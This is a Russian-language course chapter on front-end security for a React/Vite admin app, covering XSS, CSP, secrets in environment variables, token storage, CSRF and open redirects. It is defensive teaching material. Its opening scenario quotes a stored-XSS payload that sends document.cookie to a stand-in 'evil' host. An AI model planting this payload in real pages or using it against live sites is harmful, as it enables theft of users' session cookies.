# 35. Безопасность на клиенте: XSS, CSP, секреты

## Сценарий с работы

Security review admin SPA перед production: pentester показывает PoC — в поле `description` товара сохранён `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`. Если UI рендерит HTML unsanitized — XSS. Отдельно: junior dev закоммитил `VITE_STRIPE_SECRET=sk_live_...` — secret в client bundle навсегда.

React снижает часть рисков (JSX escapes strings), но **не отменяет** auth mistakes, XSS через `dangerouslySetInnerHTML`, token storage, dependency supply chain.

## Что вы узнаете

- XSS vectors в React admin apps
- CSP headers и что они дают SPA
- Почему secrets не бывают в `VITE_*`
- JWT на клиенте: threat model ([09-token-storage.md](09-token-storage.md))
- CSRF — когда relevant для SPA
- Dependency hygiene

---

## XSS в React — модель угроз

| Vector | Risk |
|--------|------|
| `{userInput}` in JSX | **Low** — escaped by default |
| `dangerouslySetInnerHTML` | **High** — only sanitized HTML |
| `href={userUrl}` `javascript:` | **High** — validate URL scheme |
| Third-party widgets | **Medium** — supply chain |
| Stored XSS via API → UI | **High** if render HTML |

**Admin catalog:** `title`, `description` from Django — treat as **untrusted** unless backend sanitizes.

```tsx
// Безопасно — text content
<p>{product.description}</p>

// Опасно
<div dangerouslySetInnerHTML={{ __html: product.description }} />

// Если rich text необходим — DOMPurify
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(product.description),
}} />
```

Default policy: **plain text only** in admin tables and detail.

---

## Content Security Policy (CSP)

CSP — HTTP header ограничивает sources scripts/styles/connect.

Пример для Vite SPA за nginx:

```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' http://localhost:8092;
  frame-ancestors 'none';
  base-uri 'self';
" always;
```

| Directive | Зачем SPA |
|-----------|-----------|
| `script-src 'self'` | блок inline injected scripts |
| `connect-src` | whitelist API `:8092` |
| `frame-ancestors 'none'` | clickjacking |
| `'unsafe-inline'` style | часто нужен Vite dev; tighten prod |

**Nonce-based CSP** — advanced; для internal admin часто достаточно strict `script-src 'self'`.

Report violations: `report-uri /csp-report` — optional monitoring.

---

## Secrets и environment variables

Vite exposes **`VITE_*`** to client bundle — **public forever**.

```env
# OK — public API URL
VITE_API_URL=https://api.shop.example

# NEVER — visible in built JS
VITE_JWT_SECRET=...
VITE_DATABASE_URL=...
```

Secrets живут **только server-side**: Django, BFF, CI secrets. Client получает **short-lived access token** после login, не master keys.

Проверка перед release:

```bash
npm run build
grep -r "sk_live" dist/ || true
```

---

## JWT threat model (кратко)

| Storage | XSS impact | CSRF |
|---------|------------|------|
| memory | token lost on refresh tab | low for Bearer header |
| localStorage | stolen via XSS | low |
| httpOnly cookie | not readable JS | needs SameSite + CSRF token |

Курс mock-exams: Bearer in memory + refresh flow ([12-refresh-flow.md](12-refresh-flow.md)). **Mitigation XSS** важнее выбора storage — CSP, sanitize, no innerHTML.

Logout on idle, short access TTL, refresh rotation — server concerns, client cooperates.

---

## CSRF и SPA

**Bearer token in Authorization header** (not cookie) — CSRF **не classic** (browser не шлёт header cross-site автоматически).

**Cookie-based session** для API — нужны:

- `SameSite=Lax/Strict`
- CSRF token double-submit или custom header
- CORS strict

Django admin API с session cookies — читайте django-cors + CSRF docs; JWT Bearer SPA проще с точки зрения CSRF.

---

## Authorization vs authentication

Client-side `role === 'admin'` для **UI hide** — OK. **Security enforcement** — только server (DRF permissions). Никогда не полагайтесь на скрытие кнопки Delete в React.

```tsx
// UX only
{user.role === "admin" && <DeleteButton />}

// Server returns 403 if forbidden — handle gracefully
```

---

## Open redirects

```tsx
// Опасно после login
const next = searchParams.get("next");
navigate(next); // ?next=https://evil.com

// Safe
const safe =
  next?.startsWith("/") && !next.startsWith("//") ? next : "/products";
navigate(safe);
```

---

## Dependency supply chain

```bash
npm audit
```

- Lockfile committed (`package-lock.json`)
- Renovate/Dependabot
- Review new deps (especially `postinstall` scripts)

MSW, RHF — reputable; random `react-admin-theme` from unknown author — risk.

---

## Error messages и information leakage

Не показывайте stack traces пользователю prod. Log client-side to monitoring (Sentry) with scrubbing PII.

```tsx
// User sees
toast.error("Не удалось сохранить товар");

// Dev only
if (import.meta.env.DEV) console.error(error);
```

---

## Лаба (кратко)

1. Audit codebase: `dangerouslySetInnerHTML`, `VITE_` env, `eval`, `target="_blank"` without `rel="noopener"`.
2. Document `.env.example` — only public vars.
3. (Optional) nginx CSP header for `npm run preview`.

**Критерий:** no secrets in repo; product description rendered as text.

---

## Типичные ошибки

1. **`VITE_` для private keys** — leaked in bundle.

2. **Trust API HTML** in admin without sanitize.

3. **JWT in localStorage + XSS** — game over; fix XSS first.

4. **Client-only role checks** — security theater.

5. **`target="_blank"` без `rel="noopener noreferrer"`** — tabnabbing.

6. **Mixed content** — HTTPS SPA → HTTP `:8092` blocked.

---

## Чек-лист

- [ ] User/API content rendered as text, not raw HTML
- [ ] No secrets in `VITE_*` or git
- [ ] CSP planned for production nginx
- [ ] Open redirect guarded on login return URL
- [ ] 403 from API handled; permissions enforced server-side
- [ ] `npm audit` clean or documented exceptions
- [ ] Prod errors не leak stack to users

---

[← 34-accessibility](34-accessibility.md) · [36-production-build →](36-production-build.md)
